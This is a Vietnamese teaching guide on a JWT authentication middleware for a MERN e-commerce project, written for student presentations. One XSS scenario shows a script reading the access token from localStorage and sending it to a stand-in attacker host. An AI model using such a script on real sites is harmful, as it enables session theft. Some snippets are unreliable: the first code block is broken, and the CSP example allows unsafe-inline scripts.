# 📚 PHÂN TÍCH BACKEND - AUTHENTICATION MIDDLEWARE

## 🎯 Dành cho sinh viên lập trình Web - Dự án E-Commerce MERN

---

## 1. 📌 ĐOẠN CODE NÀY LÀ GÌ?

```javascript
// File: server/middleware/auth.js
const jwt = require("jsonwebtoken");

const authenticateToken = (req, res, next) => {
  const authHeader =  
  const token = authHeader && authHeader.split(" ")[1];
  if (token == null) return res.sendStatus(401);
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};
```

### 📍 Thuộc phần nào của hệ thống?

- **Loại**: **MIDDLEWARE** (Trung gian xử lý)
- **Vị trí**: `server/middleware/auth.js`
- **Framework**: Express.js (NodeJS)

### 🎯 Mục đích chính

Đây là **Middleware Authentication** - bảo vệ các API route bằng cách:

1. **Kiểm tra token** từ request header
2. **Xác thực token** với JWT (JSON Web Token)
3. **Cho phép/chặn** request dựa trên kết quả xác thực

---

## 2. ❓ TẠI SAO PHẢI DÙNG NÓ?

### 🚨 Nếu KHÔNG có nó, hệ thống sẽ gặp vấn đề gì?

#### Vấn đề 1: **Bất kỳ ai cũng có thể truy cập API**

```javascript
// ❌ KHÔNG CÓ MIDDLEWARE
app.get("/api/orders", (req, res) => {
  // Ai cũng có thể xem đơn hàng của người khác!
  Order.find().then((orders) => res.json(orders));
});

// ✅ CÓ MIDDLEWARE
app.get("/api/orders", authenticateToken, (req, res) => {
  // Chỉ user đã đăng nhập mới xem được
  Order.find({ customer: req.user.id }).then((orders) => res.json(orders));
});
```

#### Vấn đề 2: **Không biết ai đang gọi API**

```javascript
// ❌ Không biết user nào đang mua hàng
app.post('/api/checkout', (req, res) => {
  // Không biết tạo order cho ai?
});

// ✅ Biết chính xác user
app.post('/api/checkout', authenticateToken, (req, res) => {
  const userId = req.user.id; // Lấy từ token
  Order.create({ customer: userId, ... });
});
```

#### Vấn đề 3: **Bị tấn công bảo mật**

- **Xem thông tin người khác**: Kẻ xấu có thể xem đơn hàng, địa chỉ, số điện thoại của user khác
- **Thay đổi dữ liệu**: Xóa sản phẩm, hủy đơn hàng của người khác
- **Chiếm quyền Admin**: Truy cập vào trang quản trị

### 💡 Nó giải quyết bài toán gì trong thực tế?

| Bài toán           | Giải pháp của Middleware                   |
| ------------------ | ------------------------------------------ |
| **Bảo mật API**    | Chỉ user đã đăng nhập mới gọi được API     |
| **Định danh user** | Biết chính xác ai đang thực hiện hành động |
| **Phân quyền**     | Kiểm tra role (Admin, Staff, Customer)     |
| **Truy vết**       | Log được user nào làm gì, khi nào          |

---

## 3. ⏰ KHI NÀO DÙNG NÓ?

### 📦 Tình huống thực tế trong dự án E-Commerce

#### ✅ NÊN dùng (Protected Routes):

```javascript
// 1. Quản lý tài khoản cá nhân
app.get("/api/user/profile", authenticateToken, getUserProfile);
app.put("/api/user/profile", authenticateToken, updateProfile);

// 2. Giỏ hàng & Đơn hàng
app.post("/api/checkout", authenticateToken, checkout);
app.get("/api/orders", authenticateToken, getMyOrders);

// 3. Wishlist & Point
app.post("/api/wishlist/:productId", authenticateToken, addToWishlist);
app.get("/api/points", authenticateToken, getMyPoints);

// 4. Comment & Review
app.post("/api/products/:id/comment", authenticateToken, addComment);

// 5. Quản trị (Admin only)
app.use("/api/admin", authenticateToken, requireAdmin, adminRoutes);
```

#### ❌ KHÔNG nên dùng (Public Routes):

```javascript
// 1. Xem sản phẩm (không cần đăng nhập)
app.get("/api/products", getProducts);
app.get("/api/products/:id", getProductDetail);

// 2. Đăng nhập & Đăng ký
app.post("/api/auth/login", login);
app.post("/api/auth/register", register);

// 3. Tìm kiếm & Lọc sản phẩm
app.get("/api/products/search", searchProducts);
app.get("/api/categories", getCategories);

// 4. Blog công khai
app.get("/api/blogs", getBlogs);
app.get("/api/blogs/:id", getBlogDetail);
```

### 🎬 Use Case thực tế: **Checkout trong E-Commerce**

```javascript
// File: server/routes/CheckoutRoute.js
const express = require("express");
const router = express.Router();
const {
  checkout,
  momoNotify,
  vnpayReturn,
} = require("../controllers/CheckoutController");
const { authenticateToken } = require("../middleware/auth");

// ✅ Cần authentication - User phải đăng nhập mới checkout được
router.post("/", authenticateToken, checkout);

// ❌ Không cần authentication - Payment gateway callback
router.post("/momo-ipn", momoNotify); // MoMo server gọi
router.get("/vnpay-return", vnpayReturn); // VNPay redirect

module.exports = router;
```

**Giải thích:**

- `/checkout` cần `authenticateToken` vì phải biết user nào đang mua
- `/momo-ipn` không cần vì MoMo server gọi (dùng signature để verify)
- `/vnpay-return` không cần vì redirect từ VNPay (verify bằng secure hash)

---

## 4. 🏗️ DÙNG NÓ Ở ĐÂU TRONG DỰ ÁN?

### 🎯 Vị trí trong kiến trúc MVC

```
┌─────────────────────────────────────────────────┐
│                   FRONTEND                      │
│  (React - client/src/pages/Checkout.jsx)       │
└────────────────┬────────────────────────────────┘
                 │ HTTP Request
                 │ Authorization: Bearer <token>
                 ▼
┌─────────────────────────────────────────────────┐
│                  MIDDLEWARE                     │
│         🔒 authenticateToken (auth.js)          │
│  ✓ Kiểm tra token                               │
│  ✓ Verify JWT                                   │
│  ✓ Gắn req.user = {id, role, email}            │
└────────────────┬────────────────────────────────┘
                 │ next()
                 ▼
┌─────────────────────────────────────────────────┐
│                  CONTROLLER                     │
│        CheckoutController.checkout()            │
│  const userId = req.user.id; ← Lấy từ token    │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│                    MODEL                        │
│  Order.create({ customer: userId, ... })       │
└────────────────┬────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────┐
│                  DATABASE                       │
│            MongoDB (Orders)                     │
└─────────────────────────────────────────────────┘
```

### 🔗 Mối quan hệ với các phần khác

#### 1️⃣ **Frontend → Middleware**

```javascript
// File: client/src/lib/axios.js
import axios from "axios";

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
});

// Interceptor: Tự động gắn token vào header
api.interceptors.request.use((config) => {
  const token = localStorage.getItem("accessToken");
  if (token) {
    config.headers.Authorization = `Bearer ${token}`; // ← Gửi token
  }
  return config;
});
```

#### 2️⃣ **Middleware → Controller**

```javascript
// File: server/controllers/CheckoutController.js
const checkout = async (req, res) => {
  const userId = req.user?.id; // ← Middleware đã gắn vào req.user
  if (!userId) return res.status(401).json({ message: "Unauthorized" });

  const user = await User.findById(userId);
  const order = await Order.create({
    customer: userId,
    cartItems: req.body.cartItems,
    totalAmount: total,
  });
};
```

#### 3️⃣ **Token được tạo ở đâu?**

```javascript
// File: server/controllers/AuthController.js
const login = async (req, res) => {
  const user = await User.findOne({ email });

  // Tạo access token
  const accessToken = jwt.sign(
    { id: user._id, role: user.role, email: user.email },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: "15m" },
  );

  res.json({ accessToken, user });
};
```

### 🗺️ Vị trí trong Clean Architecture

```
┌─────────────────────────────────────────────────┐
│        PRESENTATION LAYER (Routes)              │
│  app.post('/checkout', authenticateToken, ...)  │
└────────────────┬────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────┐
│        MIDDLEWARE LAYER (Security)              │
│  🔒 Authentication, Authorization, Validation   │
└────────────────┬────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────┐
│        APPLICATION LAYER (Controllers)          │
│  Business logic, Use cases                      │
└────────────────┬────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────┐
│        DOMAIN LAYER (Services)                  │
│  Core business rules                            │
└────────────────┬────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────┐
│        DATA LAYER (Models + Database)           │
│  MongoDB, Mongoose Schemas                      │
└─────────────────────────────────────────────────┘
```

---

## 5. ⚙️ NÓ HOẠT ĐỘNG NHƯ THẾ NÀO?

### 📖 Phân tích từng dòng code

```javascript
const jwt = require("jsonwebtoken");
// Import thư viện JWT để verify token

const authenticateToken = (req, res, next) => {
  // req: HTTP request object (chứa headers, body, params...)
  // res: HTTP response object (dùng để trả về response)
  // next: Function callback - chuyển quyền điều khiển sang middleware/controller tiếp theo

  const authHeader = req.headers["authorization"];
  // Lấy header "Authorization" từ request
  // Ví dụ: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

  const token = authHeader && authHeader.split(" ")[1];
  // Tách lấy phần token (bỏ chữ "Bearer ")
  // authHeader = "Bearer abc123" → token = "abc123"
  // Nếu authHeader null → token = undefined (short-circuit)

  if (token == null) return res.sendStatus(401);
  // Token không tồn tại → 401 Unauthorized
  // sendStatus(401): Gửi response code 401 và đóng request

  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    // Verify token với secret key
    // jwt.verify() là ASYNCHRONOUS callback-based

    if (err) return res.sendStatus(403);
    // Token không hợp lệ (sai, hết hạn, bị giả mạo) → 403 Forbidden

    req.user = user;
    // Token hợp lệ → Gắn thông tin user vào request
    // user = { id, role, email, iat, exp }

    next();
    // Chuyển quyền điều khiển sang middleware/controller tiếp theo
  });
};
```

### 🔄 Luồng chạy từ Request → Response

```
┌──────────────────────────────────────────────────────────┐
│  1. CLIENT GỬI REQUEST                                   │
│  POST /api/checkout                                      │
│  Headers: {                                              │
│    "Authorization": "Bearer eyJhbGc..."                  │
│    "Content-Type": "application/json"                    │
│  }                                                       │
│  Body: { cartItems: [...], paymentMethod: "cod" }       │
└──────────────┬───────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────┐
│  2. EXPRESS ROUTING                                      │
│  router.post('/', authenticateToken, checkout);         │
│  → Gọi middleware authenticateToken trước               │
└──────────────┬───────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────┐
│  3. MIDDLEWARE: authenticateToken                        │
│                                                          │
│  Step 1: Lấy token từ header                            │
│  ─────────────────────────────────                      │
│  const authHeader = req.headers["authorization"];       │
│  → "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZD  │
│     oiNjc4OTEyMzQ1Njc4OTAsInJvbGUiOiJDdXN0b21lciIsIm    │
│     VtYWlsIjoibmd1eWVudmFuYUBnbWFpbC5jb20iLCJpYXQiOj   │
│     E3MDk4MDA4MDAsImV4cCI6MTcwOTgwMTcwMH0.abc123..."  │
│                                                          │
│  Step 2: Tách token                                     │
│  ─────────────────────────────────                      │
│  const token = authHeader.split(" ")[1];                │
│  → "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZDoiNjc4  │
│     OTEyMzQ1Njc4OTAsInJvbGUiOiJDdXN0b21lciIsImVtYWlsI  │
│     joibmd1eWVudmFuYUBnbWFpbC5jb20iLCJpYXQiOjE3MDk4MD  │
│     A4MDAsImV4cCI6MTcwOTgwMTcwMH0.abc123..."           │
│                                                          │
│  Step 3: Verify token với secret key                    │
│  ─────────────────────────────────                      │
│  jwt.verify(token, "my-secret-key-12345", callback)     │
│                                                          │
│  ┌─────────────────────────────────────┐               │
│  │ JWT Verification Process:            │               │
│  │ 1. Decode header & payload           │               │
│  │ 2. Tạo lại signature với secret key  │               │
│  │ 3. So sánh signature                 │               │
│  │ 4. Kiểm tra expiration (exp)         │               │
│  └─────────────────────────────────────┘               │
│                                                          │
│  Step 4a: Token hợp lệ ✅                               │
│  ─────────────────────────────────                      │
│  req.user = {                                           │
│    id: "678912345678",                                  │
│    role: "Customer",                                    │
│    email: "nguyenvana@gmail.com",                       │
│    iat: 1709800800,                                     │
│    exp: 1709801700                                      │
│  };                                                     │
│  next(); → Chuyển sang controller checkout()           │
│                                                          │
│  Step 4b: Token không hợp lệ ❌                         │
│  ─────────────────────────────────                      │
│  return res.sendStatus(403);                            │
│  → DỪNG LẠI, không gọi next()                          │
└──────────────┬───────────────────────────────────────────┘
               │ (Token hợp lệ)
               ▼
┌──────────────────────────────────────────────────────────┐
│  4. CONTROLLER: checkout()                               │
│                                                          │
│  const userId = req.user.id; // ← Lấy từ middleware     │
│  const user = await User.findById(userId);              │
│  // Tạo order, trừ stock, tính toán...                  │
│  const order = await Order.create({                     │
│    customer: userId,                                    │
│    cartItems: [...],                                    │
│    totalAmount: 500000                                  │
│  });                                                    │
└──────────────┬───────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────┐
│  5. RESPONSE TRẢ VỀ CLIENT                               │
│  {                                                       │
│    "message": "Đặt hàng thành công",                    │
│    "order": {                                           │
│      "_id": "65f1234567890",                            │
│      "customer": "678912345678",                        │
│      "totalAmount": 500000,                             │
│      "orderStatus": "processing"                        │
│    }                                                    │
│  }                                                      │
└──────────────────────────────────────────────────────────┘
```

### 🔍 Có async/await không? Promise hoạt động ra sao?

**Không có async/await trong middleware này!**

```javascript
// ❌ jwt.verify() KHÔNG trả về Promise, dùng CALLBACK
jwt.verify(token, secret, (err, user) => {
  // Callback này được gọi khi verify xong
});

// ✅ Nếu muốn dùng async/await, phải wrap thành Promise:
const authenticateTokenAsync = async (req, res, next) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader?.split(" ")[1];

  if (!token) return res.sendStatus(401);

  try {
    const user = await new Promise((resolve, reject) => {
      jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, decoded) => {
        if (err) reject(err);
        else resolve(decoded);
      });
    });

    req.user = user;
    next();
  } catch (err) {
    return res.sendStatus(403);
  }
};
```

**Tại sao dùng callback thay vì async/await?**

- `jwt.verify()` của thư viện `jsonwebtoken` được thiết kế theo kiểu callback
- Đơn giản, ngắn gọn cho tác vụ verify token
- Express middleware hỗ trợ tốt cả callback và async

---

## 6. 💡 VÍ DỤ MINH HỌA THỰC TẾ

### 📱 User Flow: Mua hàng trong E-Commerce

#### Bước 1: Đăng nhập

```javascript
// Frontend: client/src/pages/Auth/Login.jsx
const handleLogin = async (email, password) => {
  const response = await axios.post("/api/auth/login", { email, password });

  // Lưu token vào localStorage
  localStorage.setItem("accessToken", response.data.accessToken);

  // Token được gắn tự động vào header bởi axios interceptor
};
```

**Token được tạo:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ODkxMjM0NTY3ODkwIiwicm9sZSI6IkN1c3RvbWVyIiwiZW1haWwiOiJuZ3V5ZW52YW5hQGdtYWlsLmNvbSIsImlhdCI6MTcwOTgwMDgwMCwiZXhwIjoxNzA5ODAxNzAwfQ.abc123def456
```

**Decode token:**

```json
{
  "id": "678912345678",
  "role": "Customer",
  "email": "nguyenvana@gmail.com",
  "iat": 1709800800, // Issued At: 07/03/2024 10:00:00
  "exp": 1709801700 // Expires: 07/03/2024 10:15:00
}
```

#### Bước 2: Thêm sản phẩm vào giỏ

```javascript
// Frontend lưu cart trong Context/State (không cần API)
const { addToCart } = useCart();
addToCart({ productId: "abc123", quantity: 2 });
```

#### Bước 3: Checkout

```javascript
// Frontend: client/src/pages/Checkout/CheckoutPage.jsx
const handleCheckout = async () => {
  // axios tự động gắn header: Authorization: Bearer <token>
  const response = await api.post("/api/checkout", {
    cartItems: [
      { productId: "abc123", quantity: 2 },
      { productId: "def456", quantity: 1 },
    ],
    paymentMethod: "cod",
    shippingAddress: "123 Nguyễn Văn A, Q1, HCM",
  });
};
```

**Request gửi đi:**

```http
POST /api/checkout HTTP/1.1
Host: localhost:5000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "cartItems": [
    { "productId": "abc123", "quantity": 2 },
    { "productId": "def456", "quantity": 1 }
  ],
  "paymentMethod": "cod",
  "shippingAddress": "123 Nguyễn Văn A, Q1, HCM"
}
```

**Backend xử lý:**

```javascript
// 1. MIDDLEWARE xác thực token
authenticateToken(req, res, next) {
  // ✓ Token hợp lệ
  // req.user = { id: "678912345678", role: "Customer", ... }
  next();
}

// 2. CONTROLLER xử lý checkout
checkout(req, res) {
  const userId = req.user.id; // "678912345678"

  // Tạo đơn hàng với đúng user
  const order = await Order.create({
    customer: userId, // ← Không thể giả mạo!
    cartItems: [...],
    totalAmount: 500000
  });
}
```

### 📊 So sánh TRƯỚC và SAU khi dùng Middleware

#### ❌ TRƯỚC (Không có Authentication)

```javascript
// Backend: server/controllers/OrderController.js
const getMyOrders = async (req, res) => {
  // Lấy userId từ... đâu???
  const userId = req.body.userId; // ← Nguy hiểm!

  // User có thể gửi userId của người khác
  const orders = await Order.find({ customer: userId });
  res.json(orders);
};
```

**Khai thác:**

```javascript
// Hacker gửi request với userId của người khác
await axios.post("/api/orders", {
  userId: "victim_user_id_123", // ← Xem đơn hàng của nạn nhân!
});
```

#### ✅ SAU (Có Authentication)

```javascript
// Backend: server/controllers/OrderController.js
const getMyOrders = async (req, res) => {
  const userId = req.user.id; // ← Lấy từ token (không thể giả mạo)

  // Chắc chắn chỉ lấy order của chính user đó
  const orders = await Order.find({ customer: userId });
  res.json(orders);
};

// Route: server/routes/OrderRoute.js
router.get("/", authenticateToken, getMyOrders); // ← Bắt buộc có token
```

**Bảo mật:**

- Token được ký bằng `ACCESS_TOKEN_SECRET` (chỉ server biết)
- User không thể tự tạo token giả
- Token có thời hạn (15 phút) → hết hạn phải login lại

---

## 7. 🎓 CÂU HỎI PHẢN BIỆN HỘI ĐỒNG CÓ THỂ HỎI

### ❓ Câu 1: "Tại sao không dùng Session/Cookie thay vì JWT?"

**Trả lời:**

| Tiêu chí               | Session/Cookie                 | JWT                             |
| ---------------------- | ------------------------------ | ------------------------------- |
| **Stateful/Stateless** | Stateful (server lưu session)  | Stateless (không lưu gì)        |
| **Scalability**        | Khó scale (phải share session) | Dễ scale (mỗi server tự verify) |
| **Mobile App**         | Khó triển khai                 | Dễ (gửi token qua header)       |
| **Microservice**       | Khó chia sẻ session            | Dễ (mỗi service tự verify)      |
| **Logout**             | Dễ (xóa session)               | Khó (phải blacklist token)      |

**Kết luận:** JWT phù hợp với:

- ✅ RESTful API
- ✅ Mobile App / React SPA
- ✅ Microservice Architecture
- ❌ Không phù hợp: Website truyền thống (SSR)

### ❓ Câu 2: "Có cách tối ưu hơn không?"

**Đề xuất cải tiến:**

#### 1️⃣ **Dùng Refresh Token**

```javascript
// Hiện tại: Access token hết hạn sau 15 phút → User phải login lại
// Cải tiến: Thêm Refresh Token (hạn 7 ngày)

// File: server/controllers/AuthController.js
const login = async (req, res) => {
  const accessToken = jwt.sign({ id, role }, ACCESS_SECRET, {
    expiresIn: "15m",
  });
  const refreshToken = jwt.sign({ id }, REFRESH_SECRET, { expiresIn: "7d" });

  // Lưu refresh token vào DB
  await RefreshToken.create({ userId: id, token: refreshToken });

  res.json({ accessToken, refreshToken });
};

// Endpoint: Làm mới access token
app.post("/api/auth/refresh", async (req, res) => {
  const { refreshToken } = req.body;

  // Verify refresh token
  const decoded = jwt.verify(refreshToken, REFRESH_SECRET);

  // Kiểm tra có trong DB không
  const storedToken = await RefreshToken.findOne({ token: refreshToken });
  if (!storedToken) return res.sendStatus(403);

  // Tạo access token mới
  const newAccessToken = jwt.sign({ id: decoded.id }, ACCESS_SECRET, {
    expiresIn: "15m",
  });
  res.json({ accessToken: newAccessToken });
});
```

#### 2️⃣ **Thêm Rate Limiting**

```javascript
const rateLimit = require("express-rate-limit");

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Tối đa 5 request
  message: "Quá nhiều lần đăng nhập. Vui lòng thử lại sau 15 phút.",
});

app.post("/api/auth/login", loginLimiter, login);
```

#### 3️⃣ **Thêm Token Blacklist (Logout)**

```javascript
// Lưu token vào Redis khi user logout
const logout = async (req, res) => {
  const token = req.headers.authorization.split(" ")[1];

  // Lưu vào blacklist với TTL = thời gian còn lại của token
  await redisClient.setex(`blacklist:${token}`, 900, "true"); // 15 phút

  res.json({ message: "Đăng xuất thành công" });
};

// Middleware: Kiểm tra token có bị blacklist không
const checkBlacklist = async (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];
  const isBlacklisted = await redisClient.get(`blacklist:${token}`);

  if (isBlacklisted) return res.sendStatus(403);
  next();
};

app.post("/api/checkout", checkBlacklist, authenticateToken, checkout);
```

#### 4️⃣ **Dùng các thư viện bảo mật**

```javascript
const helmet = require("helmet"); // HTTP headers security
const mongoSanitize = require("express-mongo-sanitize"); // Chống NoSQL injection
const xss = require("xss-clean"); // Chống XSS

app.use(helmet());
app.use(mongoSanitize());
app.use(xss());
```

### ❓ Câu 3: "Có vấn đề bảo mật nào không?"

**Các lỗ hổng và cách khắc phục:**

#### 🚨 Lỗ hổng 1: **Token bị đánh cắp (XSS Attack)**

**Kịch bản:**

```javascript
// Hacker inject script vào website
<script>
  const token = localStorage.getItem('accessToken');
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
```

**Khắc phục:**

1. **Không lưu token trong localStorage** (dễ bị XSS)

   ```javascript
   // ❌ Không an toàn
   localStorage.setItem("accessToken", token);

   // ✅ An toàn hơn: Dùng httpOnly cookie
   res.cookie("accessToken", token, {
     httpOnly: true, // JavaScript không đọc được
     secure: true, // Chỉ gửi qua HTTPS
     sameSite: "strict", // Chống CSRF
   });
   ```

2. **Content Security Policy (CSP)**
   ```javascript
   app.use(
     helmet.contentSecurityPolicy({
       directives: {
         defaultSrc: ["'self'"],
         scriptSrc: ["'self'", "'unsafe-inline'"],
       },
     }),
   );
   ```

#### 🚨 Lỗ hổng 2: **Brute Force Attack**

**Kịch bản:** Thử hàng triệu token ngẫu nhiên

**Khắc phục:**

- ✅ Dùng secret key đủ dài (>256 bits)
- ✅ Rate limiting (như trên)
- ✅ Monitor failed authentication attempts

#### 🚨 Lỗ hổng 3: **Token không expire**

**Kịch bản:** Token bị đánh cắp và dùng mãi mãi

**Khắc phục:**

```javascript
// ✅ Luôn set expiration time
const token = jwt.sign(
  { id, role },
  ACCESS_SECRET,
  { expiresIn: "15m" }, // ← BẮT BUỘC
);
```

#### 🚨 Lỗ hổng 4: **Weak Secret Key**

**Kịch bản:**

```javascript
// ❌ Secret quá yếu
const token = jwt.sign(payload, "123456");

// ✅ Secret mạnh (>256 bits, ngẫu nhiên)
const token = jwt.sign(payload, process.env.ACCESS_TOKEN_SECRET);
// ACCESS_TOKEN_SECRET=8f4e7d3c2a1b9e8f7d6c5b4a3c2d1e0f9e8d7c6b5a4b3c2d1e0f9e8d7c6b
```

**Tạo secret key mạnh:**

```javascript
// Node.js REPL
require("crypto").randomBytes(32).toString("hex");
// → "8f4e7d3c2a1b9e8f7d6c5b4a3c2d1e0f9e8d7c6b5a4b3c2d1e0f9e8d7c6b"
```

### ❓ Câu 4: "Tại sao dùng 401 và 403? Khác nhau như thế nào?"

**Trả lời:**

| Status Code          | Ý nghĩa        | Khi nào dùng?                          | Ví dụ                                |
| -------------------- | -------------- | -------------------------------------- | ------------------------------------ |
| **401 Unauthorized** | Chưa xác thực  | Token không có hoặc thiếu              | User chưa login                      |
| **403 Forbidden**    | Không có quyền | Token không hợp lệ hoặc không đủ quyền | Token hết hạn, user không phải Admin |

```javascript
// 401: Không có token
if (token == null) return res.sendStatus(401);
// User cần login

// 403: Token không hợp lệ
if (err) return res.sendStatus(403);
// Token bị giả mạo, hết hạn, hoặc sai secret

// 403: Không đủ quyền (role)
if (req.user.role !== "Admin") return res.sendStatus(403);
// User là Customer, không được vào trang Admin
```

### ❓ Câu 5: "JWT có thể bị giả mạo không?"

**Trả lời: KHÔNG thể giả mạo** (nếu implement đúng)

**Giải thích:**

JWT gồm 3 phần: `HEADER.PAYLOAD.SIGNATURE`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← HEADER
.
eyJpZCI6IjY3ODkxMjM0NTY3ODkwIiwicm9s ← PAYLOAD
ZSI6IkN1c3RvbWVyIiwiaWF0IjoxNzA5ODAw
OTAwLCJleHAiOjE3MDk4MDE4MDB9
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c ← SIGNATURE
```

**Signature được tạo như thế nào?**

```javascript
const signature = HMAC_SHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  ACCESS_TOKEN_SECRET,
);
```

**Nếu hacker thay đổi payload:**

```javascript
// Hacker thay đổi role từ "Customer" → "Admin"
{
  "id": "678912345678",
  "role": "Admin", // ← Sửa đổi
  "iat": 1709800900,
  "exp": 1709801800
}

// → Signature sẽ KHÔNG KHỚP vì:
const newSignature = HMAC_SHA256(newPayload, SECRET);
// newSignature ≠ originalSignature

// jwt.verify() → LỖI ❌
// → res.sendStatus(403)
```

**Kết luận:** Chỉ có thể giả mạo nếu:

1. ❌ Biết được `ACCESS_TOKEN_SECRET` (không thể nếu secret đủ mạnh)
2. ❌ Server không verify signature (lỗi implementation)

---

## 8. 📝 TÓM TẮT - GHI NHỚ ĐỂ THUYẾT TRÌNH

### 🎯 5 Điểm Chính

1. **Middleware Authentication** là **lớp bảo vệ** giữa Client và Controller
2. **JWT (JSON Web Token)** là chuẩn xác thực **stateless**, phù hợp REST API
3. **Bắt buộc** cho các route nhạy cảm: profile, checkout, orders, admin
4. **Không dùng** cho public route: xem sản phẩm, đăng nhập, đăng ký
5. **Bảo mật** bằng: secret key mạnh, expiration time, refresh token, HTTPS

### 🔐 Cách hoạt động (1 câu)

> "Middleware lấy token từ header, verify với secret key, nếu hợp lệ thì gắn thông tin user vào `req.user` và cho phép request đi tiếp, nếu không thì trả về 401/403."

### 📌 Use Case thực tế (1 câu)

> "Khi user checkout, middleware xác thực token để biết user nào đang mua hàng, từ đó tạo order với đúng customer ID, không thể giả mạo."

### ⚠️ Vấn đề nếu không có (1 câu)

> "Bất kỳ ai cũng có thể gọi API, xem/sửa/xóa dữ liệu của người khác, hệ thống hoàn toàn không an toàn."

### 🚀 Cách cải thiện

- ✅ Thêm Refresh Token (không phải login lại 15 phút/lần)
- ✅ Rate Limiting (chống brute force)
- ✅ Token Blacklist (cho phép logout ngay lập tức)
- ✅ httpOnly Cookie (chống XSS)
- ✅ CSP, Helmet, Sanitization (bảo mật tổng thể)

---

## 9. 🎬 DEMO CODE ĐẦY ĐỦ (Copy & Run)

### File: `server/middleware/auth.js` (Đầy đủ)

```javascript
const jwt = require("jsonwebtoken");

/**
 * Middleware: Xác thực JWT token
 * Sử dụng: router.get('/profile', authenticateToken, getProfile)
 */
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];

  if (token == null) {
    return res.status(401).json({
      message: "Token không được cung cấp. Vui lòng đăng nhập.",
    });
  }

  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    if (err) {
      // Token không hợp lệ hoặc hết hạn
      if (err.name === "TokenExpiredError") {
        return res.status(403).json({
          message: "Token đã hết hạn. Vui lòng đăng nhập lại.",
        });
      }
      return res.status(403).json({
        message: "Token không hợp lệ.",
      });
    }

    // Token hợp lệ - gắn thông tin user vào request
    req.user = user; // { id, role, email, iat, exp }
    next();
  });
};

/**
 * Middleware: Kiểm tra role (sau khi authenticate)
 * Sử dụng: router.delete('/products/:id', authenticateToken, checkRole(['Admin']), deleteProduct)
 */
const checkRole = (allowedRoles) => {
  return (req, res, next) => {
    const userRole = req.user?.role;

    if (!userRole) {
      return res.status(403).json({
        message: "Không xác định được quyền user.",
      });
    }

    if (allowedRoles.includes(userRole)) {
      next();
    } else {
      res.status(403).json({
        message: `Chặn lại! Bạn không có quyền. Yêu cầu: ${allowedRoles.join(" hoặc ")}`,
      });
    }
  };
};

/**
 * Middleware: Chỉ cho phép Admin
 * Sử dụng: router.get('/admin/analytics', authenticateToken, requireAdmin, getAnalytics)
 */
const requireAdmin = (req, res, next) => {
  const userRole = req.user?.role;

  if (userRole === "Admin") {
    next();
  } else {
    res.status(403).json({
      message: "Chỉ Admin mới có quyền truy cập.",
    });
  }
};

module.exports = {
  authenticateToken,
  checkRole,
  requireAdmin,
};
```

### File: `server/routes/CheckoutRoute.js`

```javascript
const express = require("express");
const router = express.Router();
const {
  checkout,
  momoNotify,
  vnpayReturn,
} = require("../controllers/CheckoutController");
const { authenticateToken } = require("../middleware/auth");

// Protected route - Yêu cầu authentication
router.post("/", authenticateToken, checkout);

// Public routes - Payment gateway callbacks (không cần auth vì verify bằng signature)
router.post("/momo-ipn", momoNotify);
router.get("/vnpay-return", vnpayReturn);

module.exports = router;
```

### File: `client/src/lib/axios.js` (Frontend)

```javascript
import axios from "axios";

const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || "http://localhost:5000/api",
});

// Interceptor: Tự động gắn token vào mọi request
api.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem("accessToken");
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => {
    return Promise.reject(error);
  },
);

// Interceptor: Xử lý lỗi 401/403
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401 || error.response?.status === 403) {
      // Token hết hạn hoặc không hợp lệ → Redirect to login
      localStorage.removeItem("accessToken");
      window.location.href = "/login";
    }
    return Promise.reject(error);
  },
);

export default api;
```

---

## 10. 📚 TÀI LIỆU THAM KHẢO

- **JWT Official**: https://jwt.io/
- **Express.js Middleware**: https://expressjs.com/en/guide/using-middleware.html
- **OWASP Authentication**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **jsonwebtoken npm**: https://www.npmjs.com/package/jsonwebtoken

---

## ✅ CHECKLIST TRƯỚC KHI THUYẾT TRÌNH

- [ ] Hiểu rõ JWT là gì, cấu trúc gồm 3 phần (Header, Payload, Signature)
- [ ] Nắm được khác biệt 401 vs 403
- [ ] Giải thích được luồng: Client gửi token → Middleware verify → Controller xử lý
- [ ] Biết ưu/nhược điểm JWT so với Session/Cookie
